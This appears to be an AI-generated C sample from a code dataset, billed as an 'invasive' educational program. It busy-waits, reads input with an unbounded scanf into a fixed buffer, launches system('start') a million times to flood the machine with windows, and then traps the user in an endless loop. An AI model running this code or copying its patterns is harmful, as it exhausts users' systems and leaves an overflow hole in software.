//FormAI DATASET v1.0 Category: Educational ; Style: invasive
#include<stdio.h>

int main(){
    // Welcome message
    printf("Hello there, welcome to the Invasive C example program.\n");
    printf("This program will demonstrate some of the most invasive techniques in C.\n");

    // Delay program execution for added annoyance
    for(int i =0; i<100000000; i++){
        for(int j =0; j<100000000; j++){
            // Do nothing
        }
    }

    // Ask user for their name
    char name[100];
    printf("What is your name?: ");
    scanf("%s", name);

    // Repeat their name excessively
    for(int i =0; i<10; i++){
        printf("%s\n", name);
    }

    // Open a million pop-up windows
    for(int i =0; i<1000000; i++){
        system("start");
    }

    // Use an infinite loop to prevent user from exiting the program
    while(1){
        printf("You will never leave this program!!\n");
    }

    return 0;
}